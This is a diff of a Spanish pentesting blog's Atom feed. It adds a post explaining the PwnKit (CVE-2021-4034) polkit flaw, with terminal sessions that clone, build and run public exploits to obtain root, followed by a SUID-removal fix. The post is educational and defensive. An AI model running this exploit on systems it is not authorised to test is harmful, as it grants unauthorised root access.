@@ -1,4 +1,115 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-12T20:47:21+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RiJaba1’s Page</title><subtitle>Cybersecurity Junior | HTB &amp; HMVM Player | Red Team Pentester</subtitle><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><entry><title type="html">HackMyVm Brain Writeup</title><link href="http://localhost:4000/brain-hackmyvm-writeup/" rel="alternate" type="text/html" title="HackMyVm Brain Writeup" /><published>2022-01-02T00:00:00+01:00</published><updated>2022-01-02T00:00:00+01:00</updated><id>http://localhost:4000/brain-hackmyvm-writeup</id><content type="html" xml:base="http://localhost:4000/brain-hackmyvm-writeup/">&lt;h1 id=&quot;brain-writeup&quot;&gt;Brain Writeup&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-30T20:30:19+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RiJaba1’s Page</title><subtitle>Cybersecurity Junior | HTB &amp; HMV Player | Red Team Pentester</subtitle><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><entry><title type="html">PwnKit - CVE-2021-4034</title><link href="http://localhost:4000/pwnkit-CVE-2021-4034/" rel="alternate" type="text/html" title="PwnKit - CVE-2021-4034" /><published>2022-01-30T00:00:00+01:00</published><updated>2022-01-30T00:00:00+01:00</updated><id>http://localhost:4000/pwnkit-CVE-2021-4034</id><content type="html" xml:base="http://localhost:4000/pwnkit-CVE-2021-4034/">&lt;h2 id=&quot;de-qué-trata-el-cve-2021-4034&quot;&gt;¿De qué trata el CVE-2021-4034?&lt;/h2&gt;
+
+&lt;p&gt;Este CVE corresponde a un PolKit que permite escalar privilegio de manera local aprovechándose del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt; con permisos SUID.&lt;/p&gt;
+
+&lt;h2 id=&quot;qué-sistemas-están-afectados&quot;&gt;¿Qué sistemas están afectados?&lt;/h2&gt;
+
+&lt;p&gt;Están afectadoa la mayoría de distribuciones &lt;em&gt;Major&lt;/em&gt; de Linux, esto es debido a el componente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt; de PolKit, presente en todas las versiones de PolKit superiores a la 0.113 (año 2009). Básicamente todos los sistemas Linux a partir del año 2009 estás afectados por esta vulnerabilidad.&lt;/p&gt;
+
+&lt;p&gt;También está presente en algunos equipos MAC, pero aún no se ha documentado mucho sobre este tema.&lt;/p&gt;
+
+&lt;h2 id=&quot;explotación-del-pwnkit&quot;&gt;Explotación del PwnKit.&lt;/h2&gt;
+
+&lt;p&gt;Ahora toca ir a la práctica, lo único que vamos a necesitar para ejecutar está vulnerabilidad es descargarnos un repositorio de GitHub y compilarlo en el equipo que queramos vulnerar, también existe una ‘versión’ en Python. Lo mejor del CVE-2021-4034 es que no hace falta qué se de ningún tipo de circunstancia muy rara para que el PwnKit aplique y ganemos acceso como root, otro punto bueno es que para poder llevarlo acabo solo hace falta tener Python y crear un archivo (o hacer el compilado, pero suele ser más ‘complicado’).&lt;/p&gt;
+
+&lt;p&gt;Link a los repositorios:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/berdav/CVE-2021-4034&quot;&gt;Versión para compilar&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/nikaiw/CVE-2021-4034&quot;&gt;Versión en Python&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;versión-para-compilar&quot;&gt;Versión para compilar:&lt;/h3&gt;
+
+&lt;p&gt;Para ejecutar esta vulnerabilidad solo habrá que clonar el repositorio y efectuar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make&lt;/code&gt;. Es recomendable compilar en el equipo en el que se vaya a ejecutar, si no puede dar algunos problemas más adelante:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/berdav/CVE-2021-4034
+Clonando en &lt;span class=&quot;s1&quot;&gt;'CVE-2021-4034'&lt;/span&gt;...
+remote: Enumerating objects: 64, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;64/64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;40/40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Total 64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 28&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 22&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
+Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;64/64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 15.15 KiB | 500.00 KiB/s, listo.
+Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28/28&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;CVE-2021-4034
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/CVE-2021-4034]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
+cc &lt;span class=&quot;nt&quot;&gt;-Wall&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; pwnkit.so pwnkit.c
+cc &lt;span class=&quot;nt&quot;&gt;-Wall&lt;/span&gt;    cve-2021-4034.c   &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; cve-2021-4034
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;module UTF-8// PWNKIT// pwnkit 1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gconv-modules
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;GCONV_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/bin/true &lt;span class=&quot;nv&quot;&gt;GCONV_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./pwnkit.so:.
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/CVE-2021-4034]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./cve-2021-4034
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;También adjunto una imagen por si no me creeis:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/pwnkit-CVE-2021-4034/Captura1.PNG&quot; alt=&quot;CVE-2021-4034 PwnKit RiJaba1&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;versión-en-python&quot;&gt;Versión en Python&lt;/h3&gt;
+
+&lt;p&gt;La versión de Python no es nada complicado, solo descargamos el repositorio y ejecutamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.py&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/nikaiw/CVE-2021-4034
+Clonando en &lt;span class=&quot;s1&quot;&gt;'CVE-2021-4034'&lt;/span&gt;...
+remote: Enumerating objects: 9, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6/6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Total 9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
+Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2/2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;CVE-2021-4034/
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rijaba1㉿rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/CVE-2021-4034]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 cve2021-4034.py
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Vuelvo a adjuntar imágen:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/pwnkit-CVE-2021-4034/Captura2.PNG&quot; alt=&quot;CVE-2021-4034 PwnKit RiJaba1&quot; /&gt;  
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NOTA:&lt;/strong&gt; Si neceitais ejecutarlo con Python2 podeis usar este &lt;a href=&quot;https://raw.githubusercontent.com/dadvlingd/-CVE-2021-4034/main/CVE-2021-4034-py2.py&quot;&gt;archivo.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solución-del-problema&quot;&gt;Solución del problema&lt;/h2&gt;
+
+&lt;p&gt;Solucionar el CVE-2021-4034 es bastante fácil dado que el problema está en el permiso SUID del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt;.
+Para solucionarlo vamos a escribir lso siguientes comandos:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root💀rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─# which pkexec
+/usr/bin/pkexec
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root💀rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /usr/bin/pkexec 
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 23440 jun 25  2021 /usr/bin/pkexec
+
+┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root💀rijaba1-pc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~]
+└─# &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0755 /usr/bin/pkexec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/pwnkit-CVE-2021-4034/Captura3.PNG&quot; alt=&quot;CVE-2021-4034 PwnKit RiJaba1&quot; /&gt;  
+&lt;/p&gt;
+
+&lt;p&gt;También es recomendado actualizar tu sistema operativo Linux con los comandos:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt update
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt upgrade
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En este punto ya sabéis todo sobre el PwnKit - CVE-2021-4034! Ahora toca practicar el entornos controlados!&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="PwnKit" /><category term="Hacking" /><category term="CVE-2021-4034" /><category term="CVE" /><category term="RiJaba1" /><summary type="html">En este post estaré hablando sobre el nuevo PwnKit CVE-2021-4034.</summary></entry><entry><title type="html">HackMyVm Brain Writeup</title><link href="http://localhost:4000/brain-hackmyvm-writeup/" rel="alternate" type="text/html" title="HackMyVm Brain Writeup" /><published>2022-01-02T00:00:00+01:00</published><updated>2022-01-02T00:00:00+01:00</updated><id>http://localhost:4000/brain-hackmyvm-writeup</id><content type="html" xml:base="http://localhost:4000/brain-hackmyvm-writeup/">&lt;h1 id=&quot;brain-writeup&quot;&gt;Brain Writeup&lt;/h1&gt;
 
 &lt;p&gt;En este post os enseñaré a como vulnerar la máquina Brain de la platadorma HackMyVM. La máquina está categorizada como Easy.&lt;/p&gt;
 
@@ -441,7 +552,7 @@ root@Brain:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt&lt;span
 root@Brain:~# 
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;¡Ya somos root, eso inplica que ya tenemos su flag!&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Writeup" /><category term="Writeup" /><category term="Hacking" /><category term="HackMyVM" /><summary type="html">En este artículo os enseño a como vulnerar la máquina Brain de HackMyVM</summary></entry><entry><title type="html">Herramienta portDiscoverSH</title><link href="http://localhost:4000/herramienta-portDiscoverSH/" rel="alternate" type="text/html" title="Herramienta portDiscoverSH" /><published>2021-12-19T00:00:00+01:00</published><updated>2021-12-19T00:00:00+01:00</updated><id>http://localhost:4000/herramienta-portDiscoverSH</id><content type="html" xml:base="http://localhost:4000/herramienta-portDiscoverSH/">&lt;h2 id=&quot;utilidad&quot;&gt;Utilidad&lt;/h2&gt;
+&lt;p&gt;¡Ya somos root, eso inplica que ya tenemos su flag!&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Writeup" /><category term="Hacking" /><category term="HackMyVM" /><summary type="html">En este artículo os enseño a como vulnerar la máquina Brain de HackMyVM</summary></entry><entry><title type="html">Herramienta portDiscoverSH</title><link href="http://localhost:4000/herramienta-portDiscoverSH/" rel="alternate" type="text/html" title="Herramienta portDiscoverSH" /><published>2021-12-19T00:00:00+01:00</published><updated>2021-12-19T00:00:00+01:00</updated><id>http://localhost:4000/herramienta-portDiscoverSH</id><content type="html" xml:base="http://localhost:4000/herramienta-portDiscoverSH/">&lt;h2 id=&quot;utilidad&quot;&gt;Utilidad&lt;/h2&gt;
 &lt;p&gt;Esta herramienta está diseñada para poder hacer un escaneo rápido y poco ruidoso a una IP que nosotros le asignemos.&lt;/p&gt;
 
 &lt;p&gt;El enlace a GitHub para descargar esta utilidad lo teneis más abajo.&lt;/p&gt;
@@ -462,7 +573,7 @@ sudo chmod +x portDiscover.sh
 &lt;/p&gt;
 
 &lt;h2 id=&quot;github&quot;&gt;GitHub&lt;/h2&gt;
-&lt;p&gt;Si quiereis usar esta herramienta la teneis displnible en el siguiente enlace: &lt;a href=&quot;https://github.com/RiJaba1/portDiscoverSH&quot; target=&quot;_blank&quot;&gt;https://github.com/RiJaba1/portDiscoverSH&lt;/a&gt;&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Herramientas" /><category term="Herramienta" /><category term="Hacking" /><category term="RiJaba1" /><summary type="html">Utilidad portDiscover.sh</summary></entry><entry><title type="html">Herramienta whichSystem.sh</title><link href="http://localhost:4000/herramienta-whichsystem.sh/" rel="alternate" type="text/html" title="Herramienta whichSystem.sh" /><published>2021-12-16T00:00:00+01:00</published><updated>2021-12-16T00:00:00+01:00</updated><id>http://localhost:4000/herramienta-whichsystem.sh</id><content type="html" xml:base="http://localhost:4000/herramienta-whichsystem.sh/">&lt;h2 id=&quot;utilidad&quot;&gt;Utilidad&lt;/h2&gt;
+&lt;p&gt;Si quiereis usar esta herramienta la teneis displnible en el siguiente enlace: &lt;a href=&quot;https://github.com/RiJaba1/portDiscoverSH&quot; target=&quot;_blank&quot;&gt;https://github.com/RiJaba1/portDiscoverSH&lt;/a&gt;&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Herramienta" /><category term="Hacking" /><category term="RiJaba1" /><summary type="html">Utilidad portDiscover.sh</summary></entry><entry><title type="html">Herramienta whichSystem.sh</title><link href="http://localhost:4000/herramienta-whichsystem.sh/" rel="alternate" type="text/html" title="Herramienta whichSystem.sh" /><published>2021-12-16T00:00:00+01:00</published><updated>2021-12-16T00:00:00+01:00</updated><id>http://localhost:4000/herramienta-whichsystem.sh</id><content type="html" xml:base="http://localhost:4000/herramienta-whichsystem.sh/">&lt;h2 id=&quot;utilidad&quot;&gt;Utilidad&lt;/h2&gt;
 &lt;p&gt;Esta herramienta nos permita averiguar el SO (Sistema Operativo) de una equipo sin hacer ruido y de manera instantánea.&lt;/p&gt;
 
 &lt;p&gt;Para ello esta herramienta hace uso del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; disponible en todas las versiones de Linux de manera predeterminada.&lt;/p&gt;
@@ -503,7 +614,7 @@ El TTL es: 64
 
 &lt;h2 id=&quot;github&quot;&gt;GitHub&lt;/h2&gt;
 
-&lt;p&gt;Link de la herramienta: &lt;a href=&quot;https://github.com/RiJaba1/whichSystem.sh&quot; target=&quot;_blank&quot;&gt;https://github.com/RiJaba1/whichSystem.sh&lt;/a&gt;&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Herramientas" /><category term="Herramienta" /><category term="Hacking" /><category term="RiJaba1" /><summary type="html">Utilidad whichSystem.sh</summary></entry><entry><title type="html">Canal encubierto WhatsApp</title><link href="http://localhost:4000/canal-encubierto-whatsapp/" rel="alternate" type="text/html" title="Canal encubierto WhatsApp" /><published>2021-10-08T00:00:00+02:00</published><updated>2021-10-08T00:00:00+02:00</updated><id>http://localhost:4000/canal-encubierto-whatsapp</id><content type="html" xml:base="http://localhost:4000/canal-encubierto-whatsapp/">&lt;p&gt;En el siguiente artículo os mostraré la manera de mantener una conversaciñón privado entre dos personas sin que quede ningún tipo de registro en WhatsApp.&lt;/p&gt;
+&lt;p&gt;Link de la herramienta: &lt;a href=&quot;https://github.com/RiJaba1/whichSystem.sh&quot; target=&quot;_blank&quot;&gt;https://github.com/RiJaba1/whichSystem.sh&lt;/a&gt;&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Herramienta" /><category term="Hacking" /><category term="RiJaba1" /><summary type="html">Utilidad whichSystem.sh</summary></entry><entry><title type="html">Canal encubierto WhatsApp</title><link href="http://localhost:4000/canal-encubierto-whatsapp/" rel="alternate" type="text/html" title="Canal encubierto WhatsApp" /><published>2021-10-08T00:00:00+02:00</published><updated>2021-10-08T00:00:00+02:00</updated><id>http://localhost:4000/canal-encubierto-whatsapp</id><content type="html" xml:base="http://localhost:4000/canal-encubierto-whatsapp/">&lt;p&gt;En el siguiente artículo os mostraré la manera de mantener una conversaciñón privado entre dos personas sin que quede ningún tipo de registro en WhatsApp.&lt;/p&gt;
 
 &lt;h2 id=&quot;requerimientos&quot;&gt;Requerimientos&lt;/h2&gt;
 &lt;p&gt;Antes de iniciar tenemos que hacer las siguientes cosas:&lt;/p&gt;
@@ -566,4 +677,4 @@ Dentro de la carpeta crearemos un archivo index.html como el siguiente&lt;/p&gt;
 &lt;/p&gt;
 
 &lt;h2 id=&quot;por-qué-sucede-esto&quot;&gt;¿Por qué sucede esto?&lt;/h2&gt;
-&lt;p&gt;Siempre que ingreses una URL a WhatsApp, se cargará la web en segundo plano para poder ofrecernos la previsualización del sitio. Al poner el comando de Heroku lo que conseguimos es que nos muestre todas las peticiones GET al servidor, incluyendo las de WhatsApp.&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="Tutoriales" /><category term="WhatsApp" /><category term="WhatsApp" /><category term="Heroku" /><category term="Canal encubierto" /><summary type="html">En este post aprenderemos a crear un canal encubierto en WhatsApp, usando Heroku.</summary></entry></feed>
+&lt;p&gt;Siempre que ingreses una URL a WhatsApp, se cargará la web en segundo plano para poder ofrecernos la previsualización del sitio. Al poner el comando de Heroku lo que conseguimos es que nos muestre todas las peticiones GET al servidor, incluyendo las de WhatsApp.&lt;/p&gt;</content><author><name>RiJaba1</name><email>rijaba1@protonmail.com</email></author><category term="WhatsApp" /><category term="Heroku" /><category term="Canal encubierto" /><category term="Tutoriales" /><summary type="html">En este post aprenderemos a crear un canal encubierto en WhatsApp, usando Heroku.</summary></entry></feed>
